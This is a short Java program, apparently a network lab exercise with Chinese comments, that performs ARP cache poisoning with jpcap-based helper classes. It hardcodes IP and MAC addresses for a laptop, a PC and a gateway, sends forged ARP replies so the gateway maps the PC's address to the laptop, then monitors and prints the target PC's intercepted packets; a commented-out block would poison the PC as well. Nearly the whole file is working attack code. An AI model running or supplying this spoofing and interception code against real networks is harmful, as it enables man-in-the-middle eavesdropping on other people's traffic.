package net.jpcap.arpsoft;


/**
 * arp欺骗
 * @author 岳志华
 *
 */
public class TestARPPoisoningMain {

	public static void main(String[] args) throws Exception {
		  //IP & MAC information of experiment computer No.1
		  //It's a laptop,with
		  //IP:  192.168.0.142
		  //MAC: 00-C0-9F-56-3C-70   --  88:9f:fa:59:15:58:
		String lapIP = "192.168.16.113";
		byte[] lapMac = 
			{(byte)0x88,(byte)0x9f,(byte)0xfa,(byte)0x59,(byte)0x15,(byte)0x58};

		  //IP & MAC information of experiment computer No.2
		  //It's a PC workstation, with
		  //IP:  192.168.0.173
		  //MAC: 00-10-DC-FB-17-87
		String pcIP = "192.168.16.166";
		byte[] pcMac = 
			{(byte)0x90,(byte)0xfb,(byte)0xa6,(byte)0x04,(byte)0xb9,(byte)0x21};
		
		  //IP & MAC information of experiment computer No.3
		  //It's a switch, with
		  //IP:  192.168.0.1
		  //MAC: 00-E0-FC-30-34-82
		String gateIP = "192.168.16.1";
		byte[] gateMac = 
			{(byte)0x00,(byte)0x22,(byte)0xa1,(byte)0x05,(byte)0x2b,(byte)0xf7};
		
		
//		/**
//		 * 更改目标电脑的arp缓存表
//		 */
//		ARPSender poisonPC = new ARPSender(new BindTable(gateIP, lapMac));
//		poisonPC.Send(new BindTable(pcIP, pcMac), 2000);
//		
//		/**
//		 * 更改网关的arp缓存表
//		 */
////		ARPSender dePoisonPC = new ARPSender(new BindTable(pcIP, lapMac));
////		dePoisonPC.Send(new BindTable(pcIP, pcMac), 500);
		
		
	 	ARPSender poisonGate = new ARPSender(new BindTable(pcIP, lapMac));
		poisonGate.Send(new BindTable(gateIP,gateMac), 5000);
		ARPSender dePoisonGate = new ARPSender(new BindTable(pcIP, pcMac));
		dePoisonGate.Send(new BindTable(gateIP,gateMac), 5); 
		
		/**
		 * 输出目标电脑的数据包
		 */
		ARPMonitor probe = new ARPMonitor();
		System.out.println("Monitoring...");
		probe.Monitor("192.168.16.166" , gateMac , pcMac);	

	}
	
	
}
